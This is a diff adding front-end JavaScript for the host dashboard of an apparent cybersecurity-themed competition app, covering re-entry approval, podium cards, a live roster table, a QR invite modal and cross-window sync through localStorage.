+            // RENDER DISCONNECTION APPROVAL DRAWER
+            const approvalSection = document.getElementById('hostPendingApprovalSection');
+            const pendingCountEl = document.getElementById('hostPendingCount');
+            const pendingRequestsList = document.getElementById('hostPendingRequestsList');
+
+            if (pendingList.length > 0) {
+                approvalSection.classList.remove('hidden');
+                pendingCountEl.textContent = pendingList.length;
+                pendingRequestsList.innerHTML = '';
+
+                pendingList.forEach(p => {
+                    const card = document.createElement('div');
+                    card.className = 'bg-slate-950/90 border border-amber-500/40 p-3 sm:p-4 rounded-2xl flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-inner';
+                    card.innerHTML = `
+                        <div class="space-y-1">
+                            <div class="flex items-center space-x-2">
+                                <span class="text-white font-black text-sm">${escapeHtml(p.name)}</span>
+                                <span class="text-xs font-mono text-cyan-300 font-bold">(${escapeHtml(p.rrId)})</span>
+                                <span class="px-2 py-0.5 rounded text-[10px] font-mono bg-amber-500/20 text-amber-300 border border-amber-500/30">Disconnected</span>
+                            </div>
+                            <div class="text-xs font-mono text-slate-400 flex items-center space-x-3">
+                                <span>Left At: <strong class="text-white">Task #${(p.currentTaskIndex || 0) + 1} of 10</strong></span>
+                                <span>&bull;</span>
+                                <span>Time Logged: <strong class="text-cyan-300">${formatTime(p.timeSeconds || 0)}</strong></span>
+                                <span>&bull;</span>
+                                <span>Score: <strong class="text-emerald-400">${p.score || 0} / 10</strong></span>
+                            </div>
+                        </div>
+                        <div class="flex items-center space-x-2 shrink-0">
+                            <button onclick="hostApproveReentry('${escapeHtml(p.rrId)}')" class="px-3.5 py-1.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-mono font-bold text-xs flex items-center space-x-1 shadow-sm transition">
+                                <i class="fa-solid fa-check"></i>
+                                <span>Approve Re-Entry</span>
+                            </button>
+                            <button onclick="hostDenyReentry('${escapeHtml(p.rrId)}')" class="px-3.5 py-1.5 rounded-xl bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/40 font-mono font-bold text-xs flex items-center space-x-1 transition">
+                                <i class="fa-solid fa-xmark"></i>
+                                <span>Deny</span>
+                            </button>
+                        </div>
+                    `;
+                    pendingRequestsList.appendChild(card);
+                });
+            } else {
+                approvalSection.classList.add('hidden');
+            }
+
+            // Update Top 3 Podium Cards dynamically
+            const p1 = roster[0];
+            const p2 = roster[1];
+            const p3 = roster[2];
+
+            if (p1) {
+                document.getElementById('hostPodium1Name').textContent = p1.name;
+                document.getElementById('hostPodium1Id').textContent = p1.rrId;
+                document.getElementById('hostPodium1Score').textContent = `${p1.score || 0} / 10`;
+                document.getElementById('hostPodium1Time').textContent = formatTime(p1.timeSeconds || 0);
+            } else {
+                document.getElementById('hostPodium1Name').textContent = 'Awaiting Leader...';
+                document.getElementById('hostPodium1Id').textContent = '--';
+                document.getElementById('hostPodium1Score').textContent = '0 / 10';
+                document.getElementById('hostPodium1Time').textContent = '00:00';
+            }
+
+            if (p2) {
+                document.getElementById('hostPodium2Name').textContent = p2.name;
+                document.getElementById('hostPodium2Id').textContent = p2.rrId;
+                document.getElementById('hostPodium2Score').textContent = `${p2.score || 0} / 10`;
+                document.getElementById('hostPodium2Time').textContent = formatTime(p2.timeSeconds || 0);
+            } else {
+                document.getElementById('hostPodium2Name').textContent = 'Awaiting Runner-Up...';
+                document.getElementById('hostPodium2Id').textContent = '--';
+                document.getElementById('hostPodium2Score').textContent = '0 / 10';
+                document.getElementById('hostPodium2Time').textContent = '00:00';
+            }
+
+            if (p3) {
+                document.getElementById('hostPodium3Name').textContent = p3.name;
+                document.getElementById('hostPodium3Id').textContent = p3.rrId;
+                document.getElementById('hostPodium3Score').textContent = `${p3.score || 0} / 10`;
+                document.getElementById('hostPodium3Time').textContent = formatTime(p3.timeSeconds || 0);
+            } else {
+                document.getElementById('hostPodium3Name').textContent = 'Awaiting 3rd Place...';
+                document.getElementById('hostPodium3Id').textContent = '--';
+                document.getElementById('hostPodium3Score').textContent = '0 / 10';
+                document.getElementById('hostPodium3Time').textContent = '00:00';
+            }
+
+            const tbody = document.getElementById('hostRosterTableBody');
+            if (!tbody) return;
+            tbody.innerHTML = '';
+
+            if (roster.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="8" class="py-6 text-center text-slate-500 font-mono">No participants registered in the session yet.</td></tr>`;
+                return;
+            }
+
+            roster.forEach((p, idx) => {
+                const rank = idx + 1;
+                let rankBadge = `<span class="px-2 py-0.5 rounded font-mono font-bold text-slate-400 bg-slate-800/80">#${rank}</span>`;
+                let rowHighlight = 'hover:bg-slate-800/40';
+
+                if (rank === 1) {
+                    rankBadge = `<span class="px-2.5 py-1 rounded-lg bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold flex items-center gap-1 w-fit shadow-sm">🥇 #1</span>`;
+                    rowHighlight = 'bg-amber-500/[0.04] border-l-2 border-amber-400 hover:bg-amber-500/[0.08]';
+                } else if (rank === 2) {
+                    rankBadge = `<span class="px-2.5 py-1 rounded-lg bg-slate-400/20 text-slate-200 border border-slate-400/40 font-bold flex items-center gap-1 w-fit">🥈 #2</span>`;
+                    rowHighlight = 'bg-slate-400/[0.03] border-l-2 border-slate-400 hover:bg-slate-400/[0.06]';
+                } else if (rank === 3) {
+                    rankBadge = `<span class="px-2.5 py-1 rounded-lg bg-amber-700/20 text-amber-400 border border-amber-700/40 font-bold flex items-center gap-1 w-fit">🥉 #3</span>`;
+                    rowHighlight = 'bg-amber-700/[0.03] border-l-2 border-amber-600 hover:bg-amber-700/[0.06]';
+                }
+
+                // Real-time Active Clock styling per participant status
+                let liveTimeDisplay = '';
+                if (p.status === 'IN_PROGRESS') {
+                    if (p.isPaused) {
+                        liveTimeDisplay = `
+                            <div class="flex items-center space-x-1.5 font-mono text-amber-300 font-bold">
+                                <i class="fa-solid fa-pause text-[10px] text-amber-400"></i>
+                                <span>${formatTime(p.timeSeconds || 0)}</span>
+                                <span class="text-[9px] bg-amber-500/20 text-amber-300 border border-amber-500/30 px-1 py-0.2 rounded font-mono">PAUSED</span>
+                            </div>
+                        `;
+                    } else {
+                        liveTimeDisplay = `
+                            <div class="flex items-center space-x-1.5 font-mono text-cyan-300 font-black">
+                                <span class="w-2 h-2 rounded-full bg-cyan-400 animate-ping"></span>
+                                <span>${formatTime(p.timeSeconds || 0)}</span>
+                                <span class="text-[9px] text-cyan-400/80 font-mono tracking-wider animate-pulse">LIVE</span>
+                            </div>
+                        `;
+                    }
+                } else if (p.status === 'COMPLETED') {
+                    liveTimeDisplay = `
+                        <div class="flex items-center space-x-1.5 font-mono text-emerald-400 font-bold">
+                            <i class="fa-solid fa-flag-checkered text-[11px]"></i>
+                            <span>${formatTime(p.timeSeconds || 0)}</span>
+                        </div>
+                    `;
+                } else {
+                    liveTimeDisplay = `<span class="font-mono text-slate-500">00:00</span>`;
+                }
+
+                // Live Task Progress
+                let currentTaskDisplay = `<span class="text-slate-500 text-[11px] font-mono">In Lobby</span>`;
+                if (p.status === 'IN_PROGRESS') {
+                    currentTaskDisplay = `
+                        <span class="px-2 py-0.5 rounded bg-cyan-950/80 border border-cyan-500/30 text-cyan-300 text-[11px] font-mono font-bold">
+                            Task ${(p.currentTaskIndex || 0) + 1} / 10
+                        </span>
+                    `;
+                } else if (p.status === 'PENDING_APPROVAL') {
+                    currentTaskDisplay = `
+                        <span class="px-2 py-0.5 rounded bg-amber-950/80 border border-amber-500/40 text-amber-300 text-[11px] font-mono font-bold animate-pulse">
+                            Needs Re-entry
+                        </span>
+                    `;
+                } else if (p.status === 'COMPLETED') {
+                    currentTaskDisplay = `
+                        <span class="px-2 py-0.5 rounded bg-emerald-950/80 border border-emerald-500/30 text-emerald-300 text-[11px] font-mono font-bold">
+                            All 10 Cleared
+                        </span>
+                    `;
+                }
+
+                const tr = document.createElement('tr');
+                tr.className = `${rowHighlight} transition border-b border-slate-800/40`;
+                tr.innerHTML = `
+                    <td class="py-2.5 px-3 font-mono">${rankBadge}</td>
+                    <td class="py-2.5 px-3 font-bold text-white flex items-center space-x-2">
+                        <span class="w-2 h-2 rounded-full ${p.status === 'IN_PROGRESS' ? 'bg-cyan-400 animate-pulse' : p.status === 'COMPLETED' ? 'bg-emerald-400' : p.status === 'PENDING_APPROVAL' ? 'bg-amber-400 animate-ping' : 'bg-slate-500'}"></span>
+                        <span>${escapeHtml(p.name)}</span>
+                    </td>
+                    <td class="py-2.5 px-3 font-mono text-cyan-300">${escapeHtml(p.rrId)}</td>
+                    <td class="py-2.5 px-3">
+                        <span class="px-2 py-0.5 rounded text-[10px] font-mono ${p.status === 'COMPLETED' ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30' : p.status === 'IN_PROGRESS' ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/30' : p.status === 'PENDING_APPROVAL' ? 'bg-amber-500/30 text-amber-300 border border-amber-500/50' : 'bg-slate-700 text-slate-300'}">
+                            ${p.status}
+                        </span>
+                    </td>
+                    <td class="py-2.5 px-3">${currentTaskDisplay}</td>
+                    <td class="py-2.5 px-3 text-emerald-400 font-bold">${p.score || 0} / 10</td>
+                    <td class="py-2.5 px-3">${liveTimeDisplay}</td>
+                    <td class="py-2.5 px-3 font-mono text-rose-400">+${formatTime(p.penaltiesAdded || 0)}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        /* Host Reconnection Authorization */
+        function hostApproveReentry(rrId) {
+            let roster = getStoredRoster();
+            const index = roster.findIndex(p => p.rrId === rrId);
+            if (index >= 0) {
+                roster[index].status = 'IN_PROGRESS';
+                saveParticipantToRoster(roster[index]);
+
+                const approvalSignal = {
+                    type: 'RECONNECT_APPROVAL_SIGNAL',
+                    rrId: rrId,
+                    action: 'APPROVED',
+                    participant: roster[index],
+                    timestamp: Date.now()
+                };
+
+                if (syncChannel) {
+                    try { syncChannel.postMessage(approvalSignal); } catch(e){}
+                }
+                try {
+                    localStorage.setItem('cybershield_reconnect_action', JSON.stringify(approvalSignal));
+                } catch(e){}
+
+                showToast(`Approved re-entry for ${roster[index].name} (${rrId})`, "success");
+                renderHostWarRoom();
+            }
+        }
+
+        function hostDenyReentry(rrId) {
+            let roster = getStoredRoster();
+            const index = roster.findIndex(p => p.rrId === rrId);
+            if (index >= 0) {
+                roster[index].status = 'BLOCKED';
+                saveParticipantToRoster(roster[index]);
+
+                const denialSignal = {
+                    type: 'RECONNECT_APPROVAL_SIGNAL',
+                    rrId: rrId,
+                    action: 'DENIED',
+                    timestamp: Date.now()
+                };
+
+                if (syncChannel) {
+                    try { syncChannel.postMessage(denialSignal); } catch(e){}
+                }
+                try {
+                    localStorage.setItem('cybershield_reconnect_action', JSON.stringify(denialSignal));
+                } catch(e){}
+
+                showToast(`Denied re-entry for ${rrId}`, "info");
+                renderHostWarRoom();
+            }
+        }
+
+        /* Invite Modal & QR Code Generation */
+        function openInviteModal() {
+            const url = window.location.href;
+            document.getElementById('inputInviteUrl').value = url;
+
+            const qrEl = document.getElementById('qrCodeImage');
+            qrEl.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(url)}`;
+
+            document.getElementById('modalInvite').classList.remove('hidden');
+        }
+
+        function closeInviteModal() {
+            document.getElementById('modalInvite').classList.add('hidden');
+        }
+
+        function copyInviteLink() {
+            const input = document.getElementById('inputInviteUrl');
+            input.select();
+            input.setSelectionRange(0, 99999);
+            try {
+                document.execCommand('copy');
+                showToast("Invite link copied to clipboard!", "success");
+            } catch (err) {
+                showToast("Failed to copy link.", "error");
+            }
+        }
+
+        /* Storage Event Listener for Cross-Window Sync */
+        window.addEventListener('storage', (e) => {
+            if (e.key === 'cybershield_launch_signal') {
+                if (currentParticipant.status === 'IN_LOBBY') {
+                    showToast("Host launched the event! Entering Arena...", "info");
+                    launchArenaSession();
+                }
+            } else if (e.key === 'cybershield_reconnect_action' && e.newValue) {
+                try {
+                    const actionData = JSON.parse(e.newValue);
+                    handleIncomingSync(actionData);
+                } catch(err){}
+            } else if (e.key === 'cybershield_peer_heartbeat' && e.newValue) {
+                try {
+                    const data = JSON.parse(e.newValue);
+                    handleIncomingSync(data);
+                } catch (err) {}
+            } else if (e.key === 'cybershield_roster') {
+                renderLobbyRoster();
+                updateHomeCount();
+                const warRoom = document.getElementById('screenHostWarRoom');
+                if (warRoom && !warRoom.classList.contains('hidden')) {
+                    renderHostWarRoom();
+                }
+            }
+        });
+
+        /* Window Initialization */
+        window.onload = function() {
+            updateHomeCount();
+            renderLobbyRoster();
+        };
+    </script>
+</body>
+</html>
